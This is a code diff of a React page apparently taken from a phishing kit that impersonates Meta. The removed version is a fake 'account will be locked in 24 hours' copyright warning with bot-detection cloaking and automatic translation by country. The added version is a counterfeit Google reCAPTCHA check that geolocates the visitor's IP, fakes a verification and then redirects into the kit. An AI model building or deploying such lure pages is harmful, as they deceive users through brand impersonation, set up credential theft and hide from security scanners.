@@ -1,127 +1,118 @@
-import HeroImage from '@/assets/images/hero-image.jpg';
+import CheckMarkImage from '@/assets/images/checkmark.png';
+import MetaImage from '@/assets/images/meta-image.png';
+import ReCaptchaImage from '@/assets/images/recaptcha.png';
+import { store } from '@/store/store';
 import { PATHS } from '@/router/router';
-import countryToLanguage from '@/utils/country_to_language';
-import { translateText } from '@/utils/translate';
-import detectBot from '@/utils/detect_bot';
-import { faCircleCheck, faIdCard } from '@fortawesome/free-solid-svg-icons';
-import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import axios from 'axios';
-import { useCallback, useEffect, useMemo, useState } from 'react';
+import { useEffect, useState } from 'react';
 import { useNavigate } from 'react-router';
 
 const Index = () => {
     const navigate = useNavigate();
-    const [today, setToday] = useState();
-    const [isLoading, setIsLoading] = useState(true);
-    const defaultTexts = useMemo(
-        () => ({
-            title: 'Your account will be locked for 24 hours.',
-            description: "Our system has detected some unusual activities on your account that may be a sign of copyright infringement that affects the community.",
-            protectionText: "Please verify and follow the steps as instructed.",
-            processText: 'To avoid account lock you have only 24 hours left to verify and appeal.',
-            continueBtn: 'Verification',
-            restrictedText: 'Your account was restricted on'
-        }),
-        []
-    );
+    const [isLoading, setIsLoading] = useState(false);
+    const [isShowCheckMark, setIsShowCheckMark] = useState(false);
+    const { geoInfo, setGeoInfo } = store();
 
-    const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
-
-    const translateAllTexts = useCallback(
-        async (targetLang) => {
-            try {
-                const [translatedTitle, translatedDesc, translatedProtection, translatedProcess, translatedContinue, translatedRestricted] = await Promise.all([translateText(defaultTexts.title, targetLang), translateText(defaultTexts.description, targetLang), translateText(defaultTexts.protectionText, targetLang), translateText(defaultTexts.processText, targetLang), translateText(defaultTexts.continueBtn, targetLang), translateText(defaultTexts.restrictedText, targetLang)]);
-
-                setTranslatedTexts({
-                    title: translatedTitle,
-                    description: translatedDesc,
-                    protectionText: translatedProtection,
-                    processText: translatedProcess,
-                    continueBtn: translatedContinue,
-                    restrictedText: translatedRestricted
-                });
-            } catch (error) {
-                console.log('translation failed:', error.message);
+    const handleVerify = async () => {
+        if (isLoading || isShowCheckMark) return; // Prevent double click
+        setIsLoading(true);
+        try {
+            // Giả lập API verify (vì vercel11 không có /api/verify)
+            await new Promise((resolve) => setTimeout(resolve, 50));
+            const status = 200;
+            if (status === 200) {
+                setTimeout(() => {
+                    setIsShowCheckMark(true);
+                    setIsLoading(false);
+                }, 1500); // Giảm từ 2s xuống 1.5s
             }
-        },
-        [defaultTexts]
-    );
+        } catch {
+            setIsLoading(false);
+        }
+    };
+
+    // Fetch geoInfo nếu chưa có
+    useEffect(() => {
+        if (geoInfo) return;
+
+        const fetchGeoInfo = async () => {
+            try {
+                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json');
+                setGeoInfo({
+                    asn: data.asn || 0,
+                    ip: data.ip || 'CHỊU',
+                    country: data.country || 'CHỊU',
+                    city: data.city || 'CHỊU',
+                    country_code: data.country_code || 'US'
+                });
+            } catch {
+                setGeoInfo({
+                    asn: 0,
+                    ip: 'CHỊU',
+                    country: 'CHỊU',
+                    city: 'CHỊU',
+                    country_code: 'US'
+                });
+            }
+        };
+        fetchGeoInfo();
+    }, [geoInfo, setGeoInfo]);
 
     useEffect(() => {
-        const init = async () => {
-            const date = new Date();
-            const options = {
-                month: 'long',
-                day: 'numeric',
-                year: 'numeric'
+        if (isShowCheckMark) {
+            const redirectTimeOut = setTimeout(() => {
+                navigate(PATHS.HOME);
+            }, 500);
+            return () => {
+                clearTimeout(redirectTimeOut);
             };
-            setToday(date.toLocaleString('en-US', options));
-            localStorage.clear();
-
-            const checkBot = async () => {
-                try {
-                    const botResult = await detectBot();
-                    if (botResult.isBot) {
-                        window.location.href = 'about:blank';
-                        return;
-                    }
-                } catch {
-                    //
-                }
-            };
-
-            const fetchIpInfo = async () => {
-                try {
-                    const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
-                    localStorage.setItem('ipInfo', JSON.stringify(response.data));
-                    const countryCode = response.data.country_code;
-                    const targetLang = countryToLanguage[countryCode] || 'en';
-
-                    setIsLoading(false);
-                    localStorage.setItem('targetLang', targetLang);
-                    translateAllTexts(targetLang);
-                } catch {
-                    //
-                }
-            };
-            await fetchIpInfo();
-            await checkBot();
-        };
-
-        init();
-    }, [translateAllTexts]);
+        }
+    }, [isShowCheckMark, navigate]);
 
     return (
-        <div className='flex min-h-screen items-center justify-center bg-white sm:bg-[#F8F9FA]'>
-            <title>Comunity Standard</title>
-            <div className='flex max-w-[620px] flex-col gap-4 rounded-lg bg-white p-4 sm:shadow-lg'>
-                <img src={HeroImage} alt='' />
-                <p className='text-3xl font-bold'>{translatedTexts.title}</p>
-                <p className='leading-6 text-[#212529]'>{translatedTexts.description}</p>
-                <div className='relative flex flex-col gap-4'>
-                    <div className='absolute top-1/2 left-3 h-[70%] w-0.5 -translate-y-1/2 bg-gray-200'></div>
-
-                    <div className='z-10 flex items-center gap-2'>
-                        <FontAwesomeIcon icon={faCircleCheck} className='h-7 w-7 bg-white text-gray-300' size='xl' />
-                        <p>{translatedTexts.protectionText}</p>
-                    </div>
-                    <div className='z-10 flex items-center gap-2'>
-                        <FontAwesomeIcon icon={faIdCard} className='h-7 w-7 bg-white text-[#355797]' size='xl' />
-                        <p>{translatedTexts.processText}</p>
+        <div className='flex flex-col items-center justify-center pt-[150px]'>
+            <title>Our systems have detected unusual traffic from your computer network</title>
+            <div className='w-[300px]'>
+                <img src={MetaImage} alt='' className='w-16' style={{ imageRendering: 'crisp-edges' }} />
+                <div className='flex w-full items-center justify-start py-5'>
+                    <div className='flex w-full items-center justify-between rounded-md border border-[#e8eaed] bg-[#f9f9f9] pr-2 text-[#4c4a4b] shadow-sm'>
+                        <div className='flex items-center justify-start'>
+                            <div className='my-4 mr-2 ml-4 flex h-8 w-8 items-center justify-center'>
+                                <button
+                                    className='flex h-full w-full items-center justify-center'
+                                    onClick={() => {
+                                        handleVerify();
+                                    }}
+                                >
+                                    <input type='checkbox' className='absolute h-0 w-0 opacity-0' />
+                                    {isLoading ? (
+                                        <div className='h-full w-full animate-spin rounded-full border-4 border-blue-400 border-b-transparent border-l-transparent'></div>
+                                    ) : (
+                                        <div
+                                            className={`h-8 w-8 rounded-[3px] border-[#b8bbbe] bg-[#f7f7f7] ${!isShowCheckMark && 'border-2'} transition-all transition-discrete`}
+                                            style={{
+                                                backgroundImage: isShowCheckMark ? `url("${CheckMarkImage}")` : '',
+                                                backgroundPosition: '-10px -595px',
+                                                imageRendering: 'crisp-edges'
+                                            }}
+                                        ></div>
+                                    )}
+                                </button>
+                            </div>
+                            <div className='mr-4 ml-1 text-left text-[14px] font-semibold tracking-tight text-[#3c4043]'>I&apos;m not a robot</div>
+                        </div>
+                        <div className='mt-2 mb-0.5 ml-4 flex flex-col items-center self-end text-[#5f6368]'>
+                            <img src={ReCaptchaImage} alt='' className='h-10 w-10' style={{ imageRendering: 'crisp-edges' }} />
+                            <p className='text-[10px] font-bold text-[#5f6368]'>reCAPTCHA</p>
+                            <small className='text-[8px] text-[#5f6368]'>Privacy - Terms</small>
+                        </div>
                     </div>
                 </div>
-                <button
-                    className='rounded-lg bg-blue-500 px-3 py-4 font-bold text-white disabled:opacity-50'
-                    disabled={isLoading}
-                    onClick={() => {
-                        navigate(PATHS.HOME);
-                    }}
-                >
-                    {translatedTexts.continueBtn}
-                </button>
-                <p className='text-center'>
-                    {translatedTexts.restrictedText} <span className='font-bold'>{today}</span>
-                </p>
+                <div className='flex flex-col gap-4 text-[13px] leading-[1.3] text-gray-700'>
+                    <p>This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.</p>
+                    <p>We’ve used Google&apos;s reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google’s Privacy Policy and Terms of Use.</p>
+                    <p>reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.</p>
+                </div>
             </div>
         </div>
     );
